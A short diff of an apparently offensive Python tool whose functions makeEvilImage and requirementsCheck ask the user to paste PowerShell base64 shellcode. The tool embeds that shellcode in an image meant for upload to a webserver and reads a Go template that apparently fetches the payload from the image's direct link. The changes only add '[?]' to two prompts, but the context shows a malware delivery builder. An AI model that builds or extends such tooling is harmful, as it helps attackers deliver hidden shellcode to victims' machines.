@@ -32,7 +32,7 @@ def makeEvilImage(img):
     data = data.decode('utf-8').replace('\n', '')
     success("Done - Image is .\\dist\\{0}".format(outimg))
     info("Upload .\\dist\\{0} to a Webserver - NO IMGHOSTS SINCE THEY COMPRESS THE IMG".format(outimg))
-    host = input("Direct Link: ")
+    host = input("[?] Direct Link: ")
     info("Reading Go Template")
     with open('./res/bin.go', 'r') as p:
         go_file = p.read()
@@ -71,7 +71,7 @@ def requirementsCheck(img):
         warning("tmp dir does not exist")
         os.makedirs('./tmp')
         success("Created tmp dir")
-    sc = input("Paste your Powershell base64 shellcode:")
+    sc = input("[?] Paste your Powershell base64 shellcode:")
     writeShellcode(sc)
     makeEvilImage(img)
 
